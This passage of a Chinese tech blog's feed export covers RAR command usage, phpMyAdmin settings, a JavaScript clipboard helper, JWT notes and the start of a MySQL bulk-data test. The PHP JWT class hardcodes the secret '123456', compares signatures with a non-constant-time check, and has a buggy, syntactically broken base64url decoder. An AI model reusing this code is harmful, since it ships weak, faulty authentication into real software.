<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar a tecmint.rar tecmint</span><br><span class="line"></span><br><span class="line">RAR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Creating archive tecmint.rar</span><br><span class="line"></span><br><span class="line">Adding    tecmint/index.php                                           OK</span><br><span class="line">Adding    tecmint/index.html                                          OK</span><br><span class="line">Adding    tecmint/xyz.txt                                             OK</span><br><span class="line">Adding    tecmint/abc.txt                                             OK</span><br><span class="line">Adding    tecmint                                                     OK</span><br><span class="line">Done</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-7-How-to-Delete-files-from-Archive"><a href="#Step-7-How-to-Delete-files-from-Archive" class="headerlink" title="Step 7: How to Delete files from Archive"></a>Step 7: How to Delete files from Archive</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar d filename.rar</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-8-How-to-Recover-Archives"><a href="#Step-8-How-to-Recover-Archives" class="headerlink" title="Step 8: How to Recover Archives"></a>Step 8: How to Recover Archives</h2><p>To recover or fix a archive file or files, run the command with option rar r.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar r filename.rar</span><br><span class="line"></span><br><span class="line">RAR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Building fixed.tecmint.rar</span><br><span class="line">Scanning...</span><br><span class="line">Data recovery record not found</span><br><span class="line">Reconstructing tecmint.rar</span><br><span class="line">Building rebuilt.tecmint.rar</span><br><span class="line">Found  tecmint\index.php</span><br><span class="line">Found  tecmint\index.html</span><br><span class="line">Found  tecmint\xyz.txt</span><br><span class="line">Found  tecmint\abc.txt</span><br><span class="line">Found  tecmint</span><br><span class="line">Done</span><br></pre></td></tr></table></figure></div>
<p>Step 9: How to Update Archives</p>
<hr>
<p>To update or add files to existing archive file, use the following command with option rar u.<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar u tecmint.rar tecmint.sql</span><br><span class="line"></span><br><span class="line">RAR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Updating archive tecmint.rar</span><br><span class="line"></span><br><span class="line">Adding    tecmint.sql                                                 OK</span><br><span class="line">Done</span><br></pre></td></tr></table></figure></div></p>
<p>Now, verify that the file tecmint.sql is added to archive file.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar l tecmint.rar</span><br><span class="line"></span><br><span class="line">RAR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Archive tecmint.rar</span><br><span class="line"></span><br><span class="line"> Name             Size   Packed Ratio  Date   Time     Attr      CRC   Meth Ver</span><br><span class="line"> -------------------------------------------------------------------------------</span><br><span class="line"> index.php           0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> index.html          0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> xyz.txt             0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> abc.txt             0        8   0% 18-08-12 19:11 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> tecmint             0        0   0% 18-08-12 19:23 drwxr-xr-x 00000000 m0  2.0</span><br><span class="line"> tecmint.sql 0 8 0% 18-08-12 19:46 -rw-r--r-- 00000000 m3b 2.9</span><br><span class="line"> -------------------------------------------------------------------------------</span><br><span class="line"> 6                0       40   0%</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-10-How-to-Set-Password-to-Archives"><a href="#Step-10-How-to-Set-Password-to-Archives" class="headerlink" title="Step 10: How to Set Password to Archives"></a>Step 10: How to Set Password to Archives</h2><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar a -p tecmint.rar</span><br><span class="line"></span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line"></span><br><span class="line">Reenter password:</span><br><span class="line"></span><br><span class="line">AR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Evaluation copy. Please register.</span><br><span class="line"></span><br><span class="line">Updating archive tecmint.rar</span><br><span class="line"></span><br><span class="line">Updating  tecmint.sql                                                 OK</span><br><span class="line">Done</span><br></pre></td></tr></table></figure></div>
<p>Now verify it by extracting the archive file and see whether it will prompt us to enter password that we have set above.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar x tecmint.rar</span><br><span class="line"></span><br><span class="line">RAR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Extracting from tecmint.rar</span><br><span class="line"></span><br><span class="line">Creating    tecmint                                                   OK</span><br><span class="line">Extracting  tecmint/index.php                                         OK</span><br><span class="line">Extracting  tecmint/index.html                                        OK</span><br><span class="line">Extracting  tecmint/xyz.txt                                           OK</span><br><span class="line">Extracting  tecmint/abc.txt                                           OK</span><br><span class="line">Enter password (will not be echoed) <span class="keyword">for</span> tecmint.sql:</span><br><span class="line"></span><br><span class="line">Extracting  tecmint.sql                                               OK</span><br><span class="line">All OK</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-11-How-to-Lock-Archives"><a href="#Step-11-How-to-Lock-Archives" class="headerlink" title="Step 11: How to Lock Archives"></a>Step 11: How to Lock Archives</h2><p>Another interesting lock feature from rar tool, it provides a option to lock a particular archive file from extracting it.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rar k tecmint.rar</span><br><span class="line"></span><br><span class="line">RAR 3.80   Copyright (c) 1993-2008 Alexander Roshal   16 Sep 2008</span><br><span class="line">Shareware version         Type RAR -? <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Processing archive tecmint.rar</span><br><span class="line">Locking archive</span><br><span class="line">Done</span><br></pre></td></tr></table></figure></div>
<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>For mor RAR and Unrar options and usage, run the following command it will display a list of options with their description.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># man unrar</span></span><br><span class="line"><span class="comment"># man rar</span></span><br></pre></td></tr></table></figure></div>
<p>We have presented almost all of the options above for rar and unrar commands with their examples. If you feel that we’ve missed anything in this list and you would like us to add, please update us using comment form below.</p>
<p>Sharing is Caring…</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vaG93LXRvLW9wZW4tZXh0cmFjdC1hbmQtY3JlYXRlLXJhci1maWxlcy1pbi1saW51eC8=" title="https://www.tecmint.com/how-to-open-extract-and-create-rar-files-in-linux/">文章来源<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>rar</tag>
      </tags>
  </entry>
  <entry>
    <title>【mysql】phpmyadmin学习笔记-配置</title>
    <url>/2019/10/03/%E3%80%90mysql%E3%80%91phpmyadmin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="1-输入主机地址"><a href="#1-输入主机地址" class="headerlink" title="1 输入主机地址"></a>1 输入主机地址</h2><p><code>phpmyadmin</code>不配置是默认本地地址的，启用地址可以登录其它的主机上，出于这个用途，修改<code>./libraries/config.default.php</code><br><code>$cfg[&#39;AllowArbitraryServer&#39;] = true</code><br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnBocG15YWRtaW4ubmV0L2VuL2xhdGVzdC9jb25maWcuaHRtbCNjZmdfQWxsb3dBcmJpdHJhcnlTZXJ2ZXI=" title="https://docs.phpmyadmin.net/en/latest/config.html#cfg_AllowArbitraryServer">官方文档说明<i class="fa fa-external-link"></i></span></p>
<h2 id="2-登录时长"><a href="#2-登录时长" class="headerlink" title="2, 登录时长"></a>2, 登录时长</h2><p><code>phpmyadmin</code>有登录时长,默认1440秒不操作自动退出登录，对于经常用的人来说，好烦的。 直接修改<code>./libraries/coonfig.default.php</code> <code>$cfg[&#39;LoginCookieValidity&#39;]=1440</code>,根据自己的情况来写。<br><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnBocG15YWRtaW4ubmV0L2VuL2xhdGVzdC9jb25maWcuaHRtbCNjZmdfTG9naW5Db29raWVWYWxpZGl0eQ==" title="https://docs.phpmyadmin.net/en/latest/config.html#cfg_LoginCookieValidity">官方文档说明<i class="fa fa-external-link"></i></span></p>
<a id="more"></a>
]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
      </tags>
  </entry>
  <entry>
    <title>【Javascript】Javascript笔记-函数摘要</title>
    <url>/2019/09/28/%E3%80%90Javascript%E3%80%91Javascript%E7%AC%94%E8%AE%B0-%E5%87%BD%E6%95%B0%E6%91%98%E8%A6%81/</url>
    <content><![CDATA[<h4 id="复制函数"><a href="#复制函数" class="headerlink" title="复制函数"></a>复制函数</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyStringToClipboard</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">   <span class="comment">// Create new element</span></span><br><span class="line">    <span class="keyword">var</span> el = <span class="built_in">document</span>.createElement(<span class="string">'textarea'</span>);</span><br><span class="line">    <span class="comment">// Set value (string to be copied)</span></span><br><span class="line">    el.value = str;</span><br><span class="line">    <span class="comment">// Set non-editable to avoid focus and move outside of view</span></span><br><span class="line">    el.setAttribute(<span class="string">'readonly'</span>, <span class="string">''</span>);</span><br><span class="line">    el.style = &#123;<span class="attr">position</span>: <span class="string">'absolute'</span>, <span class="attr">left</span>: <span class="string">'-9999px'</span>&#125;;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(el);</span><br><span class="line">    <span class="comment">// Select text inside element</span></span><br><span class="line">    el.select();</span><br><span class="line">    <span class="comment">// Copy text to clipboard</span></span><br><span class="line">    <span class="built_in">document</span>.execCommand(<span class="string">'copy'</span>);</span><br><span class="line">    <span class="comment">// Remove temporary element</span></span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(el);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Usage example:</span></span><br><span class="line">copyStringToClipboard(<span class="string">"abc123"</span>);</span><br></pre></td></tr></table></figure></div>
<p><span class="exturl" data-url="aHR0cHM6Ly90ZWNob3ZlcmZsb3cubmV0LzIwMTgvMDMvMzAvY29weWluZy1zdHJpbmdzLXRvLXRoZS1jbGlwYm9hcmQtdXNpbmctcHVyZS1qYXZhc2NyaXB0Lw==" title="https://techoverflow.net/2018/03/30/copying-strings-to-the-clipboard-using-pure-javascript/">摘要来源<i class="fa fa-external-link"></i></span><br><a id="more"></a></p>
<h4 id="加载完成文件再执行"><a href="#加载完成文件再执行" class="headerlink" title="加载完成文件再执行"></a>加载完成文件再执行</h4>]]></content>
      <tags>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>【前端】jwt学习笔记</title>
    <url>/2019/09/24/%E3%80%90JWT%E3%80%91JWT%E7%AC%94%E8%AE%B0-JWT%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h4><div class="note info">
            <p><code>JWT</code>是一种用于设备间数据传输的开放性标准的简洁独立的<code>JSON</code>对象凭证。由于使用数字说明,<br>所以这个凭证是验证可信的。<code>JWT</code>的签名采用的是<code>HMAC</code>哈希值或者<code>RSA</code>公私钥。</p>
          </div>
<h4 id="JWT的组成-明文"><a href="#JWT的组成-明文" class="headerlink" title="JWT的组成(明文)"></a>JWT的组成(明文)</h4><p>&emsp;3部分组成，分别<code>Header</code>,<code>Payload</code>和<code>signature</code>之间用<code>.</code>分隔并<code>base64</code>编码后反给用户。编码前格式大致<code>&#39;{&quot;type&quot;:&quot;JWT&quot;,...}.{&quot;sub&quot;:&quot;主题&quot;,...}.ABCDEFfsa!...&#39;</code>。<br>.<code>Header</code>参数</p>
<a id="more"></a>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"typ"</span>: <span class="string">"JWT"</span>,</span><br><span class="line">    <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="attr">"jti"</span>: <span class="string">"aakfkd11"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>参数</th>
<th>必有</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>typ</td>
<td>是</td>
<td>令牌类型</td>
</tr>
<tr>
<td>alt</td>
<td>是</td>
<td>算法类型</td>
</tr>
<tr>
<td>jti</td>
<td>否</td>
<td>JWT的编号也可放入<code>payload</code></td>
</tr>
</tbody>
</table>
<p>.<code>payload</code>参数(明文)</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"iss"</span>: <span class="string">"http:\/\/a784admin.mxnt.net\/api\/authorizations"</span>,</span><br><span class="line">    <span class="attr">"iat"</span>: <span class="number">1569330469</span>,</span><br><span class="line">    <span class="attr">"exp"</span>: <span class="number">1569330529</span>,</span><br><span class="line">    <span class="attr">"nbf"</span>: <span class="number">1569330469</span>,</span><br><span class="line">    <span class="attr">"jti"</span>: <span class="string">"fASGUWtJfSgBOXLq"</span>,</span><br><span class="line">    <span class="attr">"sub"</span>: <span class="number">33</span>,</span><br><span class="line">    <span class="attr">"prv"</span>: <span class="string">"cb78b5e1ffce0f831d0231df2c8bd7c806477762"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<table>
<thead>
<tr>
<th>参数</th>
<th>必有</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>iss</td>
<td>否</td>
<td>【issuer】发布者的url地址</td>
</tr>
<tr>
<td>sub</td>
<td>否</td>
<td>【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段</td>
</tr>
<tr>
<td>aud</td>
<td>否</td>
<td>【audience】接受者的url地址</td>
</tr>
<tr>
<td>exp</td>
<td>否</td>
<td>【expiration】 该jwt销毁的时间；unix时间戳</td>
</tr>
<tr>
<td>nbf</td>
<td>否</td>
<td>【not before】 该jwt的使用时间不能早于该时间；unix时间戳</td>
</tr>
<tr>
<td>iat</td>
<td>否</td>
<td>【issued at】 该jwt的发布时间；unix 时间戳</td>
</tr>
<tr>
<td>jti</td>
<td>否</td>
<td>【JWT ID】 该jwt的唯一ID编号</td>
</tr>
</tbody>
</table>
<div class="note success">
            <p><code>payload</code> 的内容根据情况调整， 以上是官方的推荐参数.</p>
          </div>
<p><code></code><br>.<code>signature</code></p>
<div class="note primary">
            <p><code>signture</code>是用于验证<code>token</code>是否合法，没有被篡改的验证依据的字串。<code>JWT</code>的生成算法有3种：<br>    .对称加密 HMAC 【哈希消息验证码】<br>    HS256/HS384/HS512<br>. 非对称加密 RSASSA【RSA签名算法】 和 ECDSA【椭圆曲线数据签名算法】<br>    RS256/RS384/RS512<br>    ES256/ES384/ES512</p>
          </div>
<h4 id="以下是采用HMAC算法的PHP-JWT封装类"><a href="#以下是采用HMAC算法的PHP-JWT封装类" class="headerlink" title="以下是采用HMAC算法的PHP JWT封装类"></a>以下是采用<code>HMAC</code>算法的<code>PHP JWT</code>封装类</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jwt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $alg = <span class="string">'sha256'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $secret = <span class="string">"123456"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHeader</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $header = [</span><br><span class="line">            <span class="string">'alg'</span> =&gt; <span class="keyword">$this</span>-&gt;alg,</span><br><span class="line">            <span class="string">'typ'</span> =&gt; <span class="string">'JWT'</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64urlEncode(json_encode($header, JSON_UNESCAPED_UNICODE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用，这里可以存放私有信息，比如uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $uid int 用户id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPayload</span><span class="params">($uid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $payload = [</span><br><span class="line">            <span class="string">'iss'</span> =&gt; <span class="string">'admin'</span>, <span class="comment">//签发人</span></span><br><span class="line">            <span class="string">'exp'</span> =&gt; time() + <span class="number">600</span>, <span class="comment">//过期时间</span></span><br><span class="line">            <span class="string">'sub'</span> =&gt; <span class="string">'test'</span>, <span class="comment">//主题</span></span><br><span class="line">            <span class="string">'aud'</span> =&gt; <span class="string">'every'</span>, <span class="comment">//受众</span></span><br><span class="line">            <span class="string">'nbf'</span> =&gt; time(), <span class="comment">//生效时间</span></span><br><span class="line">            <span class="string">'iat'</span> =&gt; time(), <span class="comment">//签发时间</span></span><br><span class="line">            <span class="string">'jti'</span> =&gt; <span class="number">10001</span>, <span class="comment">//编号</span></span><br><span class="line">            <span class="string">'uid'</span> =&gt; $uid, <span class="comment">//私有信息，uid</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;base64urlEncode(json_encode($payload, JSON_UNESCAPED_UNICODE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成token,假设现在payload里面只存一个uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $uid int</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">genToken</span><span class="params">($uid)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $header  = <span class="keyword">$this</span>-&gt;getHeader();</span><br><span class="line">        $payload = <span class="keyword">$this</span>-&gt;getPayload($uid);</span><br><span class="line"></span><br><span class="line">        $raw   = $header . <span class="string">'.'</span> . $payload;</span><br><span class="line">        $token = $raw . <span class="string">'.'</span> . hash_hmac(<span class="keyword">$this</span>-&gt;alg, $raw, <span class="keyword">$this</span>-&gt;secret);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解密校验token,成功的话返回uid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($token)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$token) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $tokenArr = explode(<span class="string">'.'</span>, $token);</span><br><span class="line">        <span class="keyword">if</span> (count($tokenArr) != <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $header    = $tokenArr[<span class="number">0</span>];</span><br><span class="line">        $payload   = $tokenArr[<span class="number">1</span>];</span><br><span class="line">        $signature = $tokenArr[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        $payloadArr = json_decode(<span class="keyword">$this</span>-&gt;base64urlDecode($payload), <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$payloadArr) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//已过期</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($payloadArr[<span class="string">'exp'</span>]) &amp;&amp; $payloadArr[<span class="string">'exp'</span>] &lt; time()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expected = hash_hmac(<span class="keyword">$this</span>-&gt;alg, $header . <span class="string">'.'</span> . $payload, <span class="keyword">$this</span>-&gt;secret);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//签名不对</span></span><br><span class="line">        <span class="keyword">if</span> ($expected !== $signature) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $payloadArr[<span class="string">'uid'</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 安全的base64 url编码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">base64urlEncode</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> rtrim(strtr(base64_encode($data), <span class="string">'+/'</span>, <span class="string">'-_'</span>), <span class="string">'='</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 安全的base64 url解码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">base64urlDecode</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> base64_decode(str_pad(strtr($data, <span class="string">'-_'</span>, <span class="string">'+/'</span>), strlen($data) % <span class="number">4</span>, <span class="string">'='</span>, STR_PAD_RIGHT))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>【mysql】数据表千万级初探</title>
    <url>/2019/08/22/%E3%80%90mysql%E3%80%91%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%8D%83%E4%B8%87%E7%BA%A7%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h4 id="开篇明议"><a href="#开篇明议" class="headerlink" title="开篇明议"></a>开篇明议</h4><p>  昨天一家公司的面试官问了个问题，有2个表就是快递详情表和快递轨迹表，每天有百万个<br>快递，数据表的每张表少说都不少于千万条，问题是怎么根据用户的id快速查找用户的快递单<br>和运动轨迹?最好查询时间控制在600毫秒下。<br>  这是一个一对多的关系，就一个快递单子有多个轨迹点。 </p>
<h4 id="测试机子环境"><a href="#测试机子环境" class="headerlink" title="测试机子环境"></a>测试机子环境</h4><p><code>OS</code>: <code>homestead:8.0.1(debian) 64位</code><br><code>内存</code> : <code>8G</code><br><code>mysql version</code>:  <code>5.7.27</code></p>
<a id="more"></a>
<h4 id="建表和添加测试数据"><a href="#建表和添加测试数据" class="headerlink" title="建表和添加测试数据"></a>建表和添加测试数据</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">create database test; -- 测试数据库</span><br><span class="line"></span><br><span class="line">-- 快递订单表</span><br><span class="line">DROP TABLE IF EXISTS `express`;</span><br><span class="line">CREATE TABLE `express` (</span><br><span class="line">  `id` int(30) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `uid` char(100) NOT NULL COMMENT &apos;用户id&apos;,</span><br><span class="line">  `p_from` char(50) NOT NULL COMMENT &apos;发件人&apos;,</span><br><span class="line">  `p_to` char(50) CHARACTER SET utf8 NOT NULL COMMENT &apos;收件人&apos;,</span><br><span class="line">  `is_receive` int(1) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;是否收件 0否 1收&apos;,</span><br><span class="line">  `create_time` int(10) NOT NULL COMMENT &apos;创建时间戳&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  KEY `uid` (`uid`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- 轨迹表</span><br><span class="line">CREATE TABLE `track` (</span><br><span class="line">  `id` int(255) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `y` float(10,0) DEFAULT NULL COMMENT &apos;y座标&apos;,</span><br><span class="line">  `x` float(10,0) DEFAULT NULL COMMENT &apos;x座标&apos;,</span><br><span class="line">  `express_id` int(22) DEFAULT NULL COMMENT &apos;单号&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  KEY `order_number` (`express_id`)</span><br><span class="line">) ENGINE=MyISAM AUTO_INCREMENT=2163031 DEFAULT CHARSET=latin1 COMMENT=&apos; 轨迹表&apos;;</span><br><span class="line"> </span><br><span class="line">-- 添加测试数据 </span><br><span class="line">create procedure add_test_data()</span><br><span class="line">begin</span><br><span class="line">    declare num int;</span><br><span class="line">    declare order_number int;</span><br><span class="line">         declare track_num int;</span><br><span class="line">        declare track_while int;</span><br><span class="line">    set num=1;</span><br><span class="line">    while num &lt;= 10000000 do</span><br><span class="line">        insert into express(uid, p_from, p_to, is_receive, create_time) values(replace(uuid(), &apos;-&apos;, 